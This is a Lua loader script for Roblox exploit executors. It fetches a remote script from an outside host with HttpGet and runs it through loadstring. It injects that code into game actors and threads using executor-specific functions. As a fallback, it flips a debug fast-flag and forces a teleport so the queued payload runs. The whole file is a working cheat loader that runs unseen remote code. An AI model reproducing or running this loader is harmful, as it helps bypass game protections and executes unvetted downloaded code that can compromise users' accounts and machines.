local Source = [[getgenv().SCRIPT_KEY = "KEYLESS"; loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/680cb3160eb57826849c357d82cb511a6986ec128fa0c3abdec457870c918cac/download"))()]]

local Executor = string.lower(identifyexecutor and identifyexecutor() or "")

local ThreadSource = [[
    local Shared = getrenv().shared

    if Shared and Shared.require then
        ]] .. Source .. [[

    end
]]

if string.find(Executor, "wave") or string.find(Executor, "choco") then
    for _, Actor in ipairs(get_deleted_actors()) do
        run_on_actor(Actor, ThreadSource)
    end
elseif string.find(Executor, "volt") or string.find(Executor, "synapse") then
    for _, Actor in ipairs(getactors()) do
        run_on_actor(Actor, ThreadSource)
    end
elseif string.find(Executor, "potassium") then
    for _, Actor in ipairs(getactorthreads()) do
        run_on_thread(Actor, ThreadSource)
    end
elseif getfflag and string.lower(tostring(getfflag("DebugRunParallelLuaOnMainThread"))) == "true" then
    loadstring(Source)()
elseif setfflag then
    setfflag("DebugRunParallelLuaOnMainThread", "True")

    if queue_on_teleport then
        queue_on_teleport([=[
            repeat task.wait() until game:IsLoaded()

            task.wait(2)
        ]=] .. Source)
    end

    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
end
